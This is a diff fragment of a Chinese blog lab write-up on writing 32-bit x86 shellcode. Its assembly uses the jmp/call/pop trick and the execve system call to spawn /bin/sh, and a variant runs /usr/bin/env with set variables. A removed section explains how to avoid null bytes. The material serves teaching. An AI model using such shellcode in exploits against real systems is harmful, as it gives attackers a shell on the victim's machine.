+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">a</span><span class="hljs-operator">=</span><span class="hljs-number">11</span><br><span class="hljs-attribute">b</span><span class="hljs-operator">=</span><span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>
+<p><strong>实验流程：</strong></p>
 <ol type="1">
-<li><p>mysh2.s代码总体流程：执行jmp short
-two语句，跳转到two中执行，two中调用one，再跳转到one中执行.这段汇编代码的主要目的是使用execve系统调用来执行/bin/sh程序.argv[]数组：argv[0]=字符串（shellcode）地址，存储于[ebx+8]位置；argv[1]=NULL指针，存储于[ebx+12]位置.</p>
+<li><p>mysh2.s代码理解：首先执行jmp short
+two语句，跳转到two中执行，two中调用one，再跳转到one中执行。这段汇编代码的主要目的是使用execve系统调用来执行/bin/sh程序。argv[]数组：argv[0]=字符串（shellcode）地址，存储于[ebx+8]位置；argv[1]=NULL指针，存储于[ebx+12]位置.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>		BITS 32<br>		jmp short two<br>    one:<br>        pop ebx					# ebx=字符串(shellcode)地址<br>        xor eax, eax			# eax=0<br>        mov [ebx+7], al			# [ebx+7]=0  前8字节内容：/bin/sh\0<br>        mov [ebx+8], ebx   		# 赋值前：[ebx+8]=AAAA  赋值后：[ebx+8]=字符串(shellcode)地址<br>        mov [ebx+12], eax		# 赋值后：[ebx+12]=BBBB 赋值后：[ebx+12]=0<br>        lea ecx, [ebx+8] 		# ecx=argv[]地址<br>        xor edx, edx			# edx=0 即无环境变量<br>        mov al,  0x0b			# eax=11（十进制）即系统调用号<br>        int 0x80				# 执行系统调用<br>    two:<br>        call one				# 调用one函数，将下一条语句地址压入栈，作为ret，再跳转到one中继续执行<br>        db &#x27;/bin/sh*AAAABBBB&#x27; 	# shellcode<br></code></pre></td></tr></table></figure></li>
 <li><p>目标：执行命令<code>/usr/bin/env -i a=11 b=22</code>.该命令用于清除环境变量并为两个特定变量
 a 和 b 设置新的值.</p>
 <ul>
-<li><p>代码编写：代码工作主要集中在argv[]的构造，从参数1指针到参数4指针，地址递增，而栈空间是由高地址向低地址增长，符合从右至左依次入栈.其余部分与原代码基本相同</p>
+<li><p>代码编写：代码工作主要集中在argv[]的构造，从参数0指针到参数4指针，地址递增，而栈空间是由高地址向低地址增长，符合从右至左依次入栈。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>		BITS 32<br>		jmp short two<br>    one:<br> 		pop ebx		;ebx=address of shellcode<br> 		xor eax, eax<br><br>        mov [ebx+12], al<br>        mov [ebx+15], al<br>        mov [ebx+20], al<br>        mov [ebx+25], al	;Replace the placeholder with zero<br>	<br>	;Construct argv[]	;Before assignment:[ebx+26]=AAAA<br>        mov [ebx+26],ebx 	;After  assignment:[ebx+26]=address of &quot;/usr/bin/env\0&quot;  argv[0]<br>        <br>        lea eax,[ebx+13]	;Before assignment:[ebx+30]=BBBB<br>        mov [ebx+30],eax 	;After  assignment:[ebx+30]=address of &quot;-i\0&quot;		argv[1]<br>        			<br>        lea eax,[ebx+16]	;Before assignment:[ebx+34]=CCCC<br>        mov [ebx+34],eax 	;After  assignment:[ebx+34]=address of &quot;a=11\0&quot;	argv[2]<br>        <br>        lea eax,[ebx+21]	;Before assignment:[ebx+38]=DDDD<br>        mov [ebx+38],eax 	;After  assignment:[ebx+38]=address of &quot;b=22\0&quot;	argv[3]<br><br>        xor eax,eax<br>        mov [ebx+42],eax 	;argv[4]=NULL point<br>  <br><br>        lea ecx, [ebx+26] 	;ecx = address of &quot;/usr/bin/env -i a=11 b=22&quot;<br> 		xor edx, edx		;edx = 0 	No environment variables<br> 		mov al,  0x0b		;eax = 0x0b	System call number<br> 		int 0x80		;Start system call<br>     two:<br> 		call one<br> 		db &#x27;/usr/bin/env#-i#a=11#b=22#AAAABBBBCCCCDDDDEEEE&#x27;<br> 	  	   ;0    5    1    5    2    5    3    5    4    5<br></code></pre></td></tr></table></figure></li>
-<li><p>编译链接执行，成功打印环境变量</p>
+<li><p>编译链接执行，成功打印环境变量。</p>
 <figure>
 <img
 src="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310171938160.png" srcset="/img/loading.gif" lazyload
@@ -421,22 +591,6 @@ alt="image-20231017193616472" />
 </figure></li>
 </ul></li>
 </ol>
-<h1 id="总结">4 总结</h1>
-<h2 id="去除二进制代码中的零">4.1 去除二进制代码中的零</h2>
-<ul>
-<li><p>使用<code>xor eax，eax</code>代替<code>mov eax, 0</code></p></li>
-<li><p>如果我们要存储0x0000099到 eax.我们不能只使用 mov
-eax，0x99，因为第二个操作数实际上是0x0000099，它包含三个零.首先将 eax
-设置为零，然后为 al 寄存器分配一个1字节的数字0x99</p></li>
-<li><p>使用移位操作，下面操作等价于将xyz\0赋给ebx</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ebx, &quot;xyz#&quot;<br>shl ebx, 8<br>shr ebx, 8<br></code></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="获取命令中使用的数据地址">4.2 获取命令中使用的数据地址</h2>
-<ul>
-<li>动态地在堆栈上构建所有必要的数据结构，因此可以从堆栈指针
-esp获取数据地址</li>
-<li>数据存储在代码区中，其地址通过函数调用机制获取</li>
-</ul>
 <p>参考教程：</p>
 <ol type="1">
 <li><a
